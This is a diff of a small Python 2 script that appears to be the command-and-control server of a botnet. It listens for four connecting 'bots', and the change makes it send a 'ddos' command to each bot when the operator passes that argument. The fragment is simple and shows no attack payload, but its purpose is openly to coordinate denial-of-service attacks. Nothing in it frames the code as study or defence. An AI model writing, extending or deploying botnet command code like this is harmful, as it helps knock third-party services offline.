@@ -35,9 +35,10 @@ s_1.listen(5)                 		# Now wait for client connection on bot 1.
 s_2.listen(5)                 		# Now wait for client connection on bot 2.
 s_3.listen(5)                 		# Now wait for client connection on bot 3.
 s_4.listen(5)                 		# Now wait for client connection on bot 4.
-
-if( sys.argv[1] == commands[0]):
-	print "Send ddos command to all active bots"
+if(len(sys.argv)==2):
+	if( sys.argv[1] == commands[0]):
+		cmd=1
+		print "Send ddos command to all active bots"
 while True:
 	try:
 		if not conn_bot_1:
@@ -45,7 +46,8 @@ while True:
 			s_1.settimeout(1)
 			c, addr = s_1.accept()    	# Establish connection with client.
 			print 'Got connection from bot 1', addr
-			c.send('Thank you for connecting bot 1')
+			if(cmd==1):
+				c.send('ddos')
 			conn_bot_1 = 1
 			c.close()                	# Close the connection
 	except:
